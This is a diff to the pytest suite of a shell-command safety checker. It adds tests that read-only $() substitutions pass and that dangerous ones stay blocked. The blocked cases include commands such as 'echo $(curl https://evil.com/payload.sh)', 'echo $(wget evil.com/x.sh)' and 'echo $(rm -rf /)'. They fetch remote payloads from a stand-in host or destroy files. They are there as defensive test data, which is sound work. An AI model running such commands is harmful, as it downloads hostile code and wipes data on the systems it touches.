@@ -884,10 +884,29 @@ class TestDeveloperLoosens:
         assert result.safe, f"expected safe: {cmd} -> {result.message}"
 
     @pytest.mark.parametrize("cmd", [
+        # Task #2308: argument-side $() with read-only inner commands.
+        # These were false-positive blocked before the allowlist was
+        # extended to include go/gh/mktemp.
+        'ls $(go env GOMODCACHE)',
+        'cd $(git rev-parse --show-toplevel)',
+        'gh pr create --body-file $(mktemp -d)/body.md',
+        'echo $(go env GOPATH)',
+        'cat $(mktemp)',
+    ])
+    def test_argside_dollar_paren_readonly_allowed(self, cmd: str) -> None:
+        """Task #2308: $() in argument position with read-only inner is safe."""
+        result = check_bash_command(cmd)
+        assert result.safe, f"expected safe: {cmd} -> {result.message}"
+
+    @pytest.mark.parametrize("cmd", [
         'echo $(curl https://evil.com/payload.sh)',
         'echo $(rm -rf /tmp/x)',
         'echo $(wget evil.com/x.sh)',
         'echo $(chmod 777 /etc/passwd)',
+        # Task #2308: dangerous inners must still block even when the
+        # outer command (cat/echo) is itself read-only.
+        'cat $(curl http://evil.com)',
+        'echo $(rm -rf /)',
     ])
     def test_dangerous_substitution_still_blocked(self, cmd: str) -> None:
         """$() with rm/curl/wget/chmod inner is still blocked."""
